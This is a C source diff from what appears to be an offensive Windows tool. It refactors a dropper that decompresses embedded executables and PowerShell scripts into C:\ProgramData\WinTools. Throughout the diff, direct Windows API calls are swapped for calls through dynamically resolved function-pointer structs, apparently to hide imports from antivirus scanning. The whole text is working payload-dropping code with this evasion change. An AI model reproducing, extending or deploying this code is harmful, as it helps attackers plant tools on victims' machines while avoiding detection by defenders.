@@ -85,7 +85,7 @@ StrucFile fileStruc[] = {
 
 'DecompressedBufferSize' was corrupted.
 */
-BOOL DecompressDrop(LPCWSTR dropPath, PBYTE CompressedBuffer, DWORD InputFileSize) {
+BOOL DecompressDrop(Kernel32_API kernel32, Cabinet_API cabinetAPI,LPCWSTR dropPath, PBYTE CompressedBuffer, DWORD InputFileSize) {
     DECOMPRESSOR_HANDLE Decompressor = NULL;
     PBYTE DecompressedBuffer = NULL;
 
@@ -98,14 +98,14 @@ BOOL DecompressDrop(LPCWSTR dropPath, PBYTE CompressedBuffer, DWORD InputFileSiz
     BOOL retValue = TRUE;
 
     //  Open an empty file for writing, if exist, destroy it.
-    DecompressedFile = CreateFileW(dropPath, GENERIC_WRITE | DELETE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
+    DecompressedFile = kernel32.CreateFileWF(dropPath, GENERIC_WRITE | DELETE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (DecompressedFile == INVALID_HANDLE_VALUE) {
         printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot create file \t%ws", dropPath);
         return FALSE;
     }
 
     //  Create an XpressHuff decompressor.
-    if (!CreateDecompressor(COMPRESS_ALGORITHM_XPRESS_HUFF, NULL, &Decompressor)) {
+    if (!cabinetAPI.CreateDecompressorF(COMPRESS_ALGORITHM_XPRESS_HUFF, NULL, &Decompressor)) {
         printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot create a decompressor");
         retValue = FALSE;
         goto done;
@@ -113,7 +113,7 @@ BOOL DecompressDrop(LPCWSTR dropPath, PBYTE CompressedBuffer, DWORD InputFileSiz
 
     //  Query decompressed buffer size.
     //  Allocate memory for decompressed buffer.
-    if (!Decompress(Decompressor, CompressedBuffer, InputFileSize, NULL, 0, (PSIZE_T)&DecompressedBufferSize)) {
+    if (!cabinetAPI.DecompressF(Decompressor, CompressedBuffer, InputFileSize, NULL, 0, (PSIZE_T)&DecompressedBufferSize)) {
         DWORD ErrorCode = GetLastError();
         if (ErrorCode != ERROR_INSUFFICIENT_BUFFER || DecompressedBufferSize == 0) {
             printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot decompress data");
@@ -129,13 +129,13 @@ BOOL DecompressDrop(LPCWSTR dropPath, PBYTE CompressedBuffer, DWORD InputFileSiz
         }
     }
     //  Decompress data and write data to DecompressedBuffer.
-    if (!Decompress(Decompressor, CompressedBuffer, InputFileSize, DecompressedBuffer, DecompressedBufferSize, (PSIZE_T)&DecompressedDataSize)) {
+    if (!cabinetAPI.DecompressF(Decompressor, CompressedBuffer, InputFileSize, DecompressedBuffer, DecompressedBufferSize, (PSIZE_T)&DecompressedDataSize)) {
         printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot decompress data");
         retValue = FALSE;
         goto done;
     }
     //  Write decompressed data to output file.
-    Success = WriteFile(DecompressedFile, DecompressedBuffer, (DWORD)DecompressedDataSize, &ByteWritten, NULL); 
+    Success = kernel32.WriteFileF(DecompressedFile, DecompressedBuffer, (DWORD)DecompressedDataSize, &ByteWritten, NULL);
     if ((ByteWritten != DecompressedDataSize) || (!Success)) {
         printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot write decompressed data to file");
         retValue = FALSE;
@@ -144,7 +144,7 @@ BOOL DecompressDrop(LPCWSTR dropPath, PBYTE CompressedBuffer, DWORD InputFileSiz
     DeleteTargetFile = FALSE;
 done:
     if (Decompressor != NULL)
-        CloseDecompressor(Decompressor);
+        cabinetAPI.CloseDecompressorF(Decompressor);
     if (DecompressedBuffer) 
         free(DecompressedBuffer);
 
@@ -154,18 +154,18 @@ done:
         if (DeleteTargetFile) {
             FILE_DISPOSITION_INFO fdi;
             fdi.DeleteFile = TRUE;      //  Marking for deletion
-            Success = SetFileInformationByHandle(DecompressedFile, FileDispositionInfo, &fdi, sizeof(FILE_DISPOSITION_INFO));
+            Success = kernel32.SetFileInformationByHandleF(DecompressedFile, FileDispositionInfo, &fdi, sizeof(FILE_DISPOSITION_INFO));
             if (!Success) {
                 printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Cannot delete corrupted decompressed file");
                 retValue = FALSE;
             }
         }
-        CloseHandle(DecompressedFile);
+        kernel32.CloseHandleF(DecompressedFile);
     }
     return retValue;
 }
 
-BOOL DropFile(char* wincatDefaultDir, StrucFile fileStruc) {
+BOOL DropFile(Kernel32_API kernel32, Cabinet_API cabinetAPI, char* wincatDefaultDir, StrucFile fileStruc) {
 	//FILE* pFile;
 	//const WCHAR* defaultDropPath = L"C:\\ProgramData\\WinTools"; // "C:\\Users\\Public\\Documents";
 	//const WCHAR* defaultPsDropPath = L"C:\\ProgramData\\WinTools\\PsScript"; // "C:\\Users\\Public\\Documents";
@@ -178,7 +178,7 @@ BOOL DropFile(char* wincatDefaultDir, StrucFile fileStruc) {
     swprintf_s(defaultDropPath, MAX_PATH * sizeof(WCHAR), L"%hs", wincatDefaultDir);
 
 
-	if (!CreateDirectoryW(defaultDropPath, NULL)) {
+	if (!kernel32.CreateDirectoryWF(defaultDropPath, NULL)) {
 		if (GetLastError() == ERROR_PATH_NOT_FOUND) {
 			printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "ERROR_PATH_NOT_FOUND %ws", defaultDropPath);
 			return FALSE;
@@ -188,7 +188,7 @@ BOOL DropFile(char* wincatDefaultDir, StrucFile fileStruc) {
 
     if (!fileStruc.isExe) {
         swprintf_s(defaultPsDropPath, MAX_PATH * sizeof(WCHAR), L"%hs\\PsScript", wincatDefaultDir);
-        if (!CreateDirectoryW(defaultPsDropPath, NULL)) {
+        if (!kernel32.CreateDirectoryWF(defaultPsDropPath, NULL)) {
             if (GetLastError() == ERROR_PATH_NOT_FOUND) {
                 printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "ERROR_PATH_NOT_FOUND %ws", defaultDropPath);
                 return FALSE;
@@ -209,7 +209,7 @@ BOOL DropFile(char* wincatDefaultDir, StrucFile fileStruc) {
 
 
 
-    if (DecompressDrop(pathFile, (PBYTE)fileStruc.buffer, fileStruc.size)){
+    if (DecompressDrop(kernel32, cabinetAPI, pathFile, (PBYTE)fileStruc.buffer, fileStruc.size)){
         printMsg(STATUS_INFO2, LEVEL_DEFAULT, "Dropping: '%ws' %i kb\n", pathFile, fileStruc.size / 100);
         free(pathFile);
         return TRUE;
@@ -221,21 +221,21 @@ BOOL DropFile(char* wincatDefaultDir, StrucFile fileStruc) {
 }
 
 
-BOOL DropFiles(char* wincatDefaultDir, ToDropEnum toDROP) {
+BOOL DropFiles(Kernel32_API kernel32, Cabinet_API cabinetAPI,char* wincatDefaultDir, ToDropEnum toDROP) {
 	switch (toDROP){
 	case Nothing:
 		break;
 	case ALL:
 		for (int i = 0; i < sizeof(fileStruc) / sizeof(StrucFile); i++)
-			DropFile(wincatDefaultDir, fileStruc[i]);
+			DropFile(kernel32, cabinetAPI, wincatDefaultDir, fileStruc[i]);
 		break;
     case SAFE:
 		for (int i = 0; i < sizeof(fileStruc) / sizeof(StrucFile); i++)
             if(fileStruc[i].isSafe)
-			    DropFile(wincatDefaultDir, fileStruc[i]);
+			    DropFile(kernel32, cabinetAPI, wincatDefaultDir, fileStruc[i]);
 		break;
 	default:
-		DropFile(wincatDefaultDir, fileStruc[toDROP]);
+		DropFile(kernel32, cabinetAPI, wincatDefaultDir, fileStruc[toDROP]);
 		break;
 	}
 	return FALSE;
